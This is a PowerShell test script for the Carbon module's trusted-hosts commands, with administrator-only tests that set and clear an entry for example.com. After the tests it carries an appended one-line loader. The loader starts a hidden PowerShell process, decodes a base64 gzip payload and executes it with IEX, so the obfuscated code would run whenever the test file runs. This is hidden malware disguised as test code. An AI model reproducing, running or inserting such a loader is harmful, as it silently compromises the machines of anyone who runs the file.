











& (Join-Path $TestDir ..\Initialize-CarbonTest.ps1 -Resolve)


if( Test-AdminPrivilege )
{
    $originalTrustedHosts = $null

    function Start-Test
    {
        $originalTrustedHosts = @( Get-TrustedHost )
    }

    function Stop-Test
    {
        if( $originalTrustedHosts )
        {
            Set-TrustedHost -Entry $originalTrustedHosts
        }
    }

    function Test-ShouldRemoveTrustedHosts
    {
        Set-TrustedHost 'example.com'
        Assert-Equal 'example.com' (Get-TrustedHost)
        Clear-TrustedHost
        Assert-Null (Get-TrustedHost)
    }
    
    function Test-ShouldSupportWhatIf
    {
        Set-TrustedHost 'example.com'
        Assert-Equal 'example.com' (Get-TrustedHost)
        Clear-TrustedHost -WhatIf
        Assert-Equal 'example.com' (Get-TrustedHost)
    }
    
        
}
else
{
    Write-Warning "Only Administrators can modify the trusted hosts list."
}


if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIADul3lcCA7VW+2/iOBD+uSvt/xCtkEi0lABl26XSSufwLo9CA+G16OQmTjCYmDpOeezt/34TIC3VtqvenS5qhZ2ZsT9/840nbujbknJfCZs7y9g0lR8fP5x1sMBLRU2I1cK0Cyklwe6dde9SOzsDYyKoFwpeTfypfFPUCVqtSnyJqT+9vi6GQhBfHubpKpEoCMjynlESqJrylzKYEUHOb+/nxJbKDyXxZ7rK+D1mR7dtEdszopwj34lsTW7jCFnaXDEq1eT370ltcp6dpssPIWaBmjS3gSTLtMNYUlN+atGGve2KqMkWtQUPuCvTA+pf5NJ9P8AuacNqj6RF5Iw7QVKDk8CfIDIUvvJ0pmiRg4uahGFHcBs5jiABRKTr/iNfEDXhh4yllD/UyRHBXehLuiRgl0TwlUnEI7VJkK5h32HkjrhTtU3W8cHfG6SeBoFXRwotBUl5A2qLOyEjh+ik9ivYYzI1eJ4TCiz8/Pjh4wc3VsF60fGzmSGp8uCFFGB0NtmPCcBVOzyge/9vSialtGBTLLnYwjTREyHRpsokSsVkOlUS8wYv9GjX9I1x6u1lsnEMRJD8qnBboK3izWYOponFqTOF0GPOEjs5vnwwZzsZGd8WYIm41CelrY+X1I41pr6WCuIysj9/OnZrA0I1eTQQp0QY8bCMiE0pk1/Dyksqn2KNkDKHCGRDOgNABZnWXoI55EpN1v0WWQJvh3kS8uKCsknsfVTzNt49moNTsshwEKSUTgilZacUk2BGnJSC/IAeTSiUfD9MPsNthUxSGwcyXm6qvSDzuGmR+4EUoQ35BAJ65orYFLOIj5RSow4xtib14s2Tr7JRxIxR34OVHiEb8CZiwZSRSgTgPFWEljaJrC9XjCzBdV/vFYY9qO5jfezVhT3iJF9FGxfAQe0ROTErJ1gh4ybjMqVYVEi4OyKiTzX2nyCdXCLP4IqCHPOlxiU2MbYyKojEtmfnhu1gFIn3yN2eKSGBpYrgSwMH5DJvSgEcqp/0W1pE8IzqPmvZxoJm0Zpm6y3479OLOi9dOY2beU0Xpc3MRfWg3qp1St1aLf94Y1p5aZbrstGpy1Z5OJ+bqHbXH8lxHdV6NLMY5XerG7ozm8gZbfTLnbFbZ4zNbu457qjkut6Va95lv1Roc1DsGpkcbpbKYXNgrI1MPijTda1L+93FTUXejyyG+67uDbMFTDdNMbeyvLWrI1SdXdi7G9eqzlrOdlTTC4P8ApURKvplq2LwxsgQqKNb2LP4uuEZzsArIqNiUzLu9itGt1sxUL86fygVdA9ih3hmDKwcHa+GdzOYVwBCQ8/k6w7Z8VEXSKpyhL078PGKOXvmgk/pMzI+t3mQwwuDIwN8KuMHwDVaVToM7L1+jiOLtYcYNcfbiq5nR508qmXooOqhaEnsGV2MgsfSrqRnLYc7gy/tkatbQ3all4q9le3qur6ulRr2OLv5env1tTmg1pKjvq5bnyKBgEISIuydpPutq7+FRTDDDGQA93lcpRUuKsfbucNpFKGqca9eEOETBh0OemAsbsQYt6NG8eIqh2Z1aCFTqNg+DC9yr4405clRe24i8avr6zEAhnKJNZxuEt+Ts1Rmc5HJQCfIbPIZOPP7D1rkq636tFwq6iYRWadbsP0WWlRDiVW1ih/+dyaP1TuDH+e9TD6/+431XexmUnsGfnn78sU/YvnfkDDAVIKzCZcQI4d++XsujgI6+fTYZwu04R6f6BvwNpTnbfgk+RvCgsFUeAoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

